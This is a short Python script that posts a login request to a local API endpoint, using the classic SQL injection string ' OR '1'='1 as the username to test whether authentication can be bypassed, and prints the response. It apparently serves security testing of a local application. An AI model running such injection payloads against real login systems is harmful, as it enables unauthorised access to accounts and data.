import urllib.request
import urllib.error
import json

url = "http://127.0.0.1:18080/api/v1/auth/login"
payload = json.dumps({
    "pseudonym": "' OR '1'='1",
    "password": "anything"
}).encode('utf-8')

req = urllib.request.Request(url, data=payload, headers={"Content-Type": "application/json"})

try:
    with urllib.request.urlopen(req) as resp:
        print("Status:", resp.getcode())
        print("Body:", resp.read().decode())
except urllib.error.HTTPError as e:
    print("Status:", e.code)
    print("Body:", e.read().decode())
except Exception as e:
    print("Error:", e)
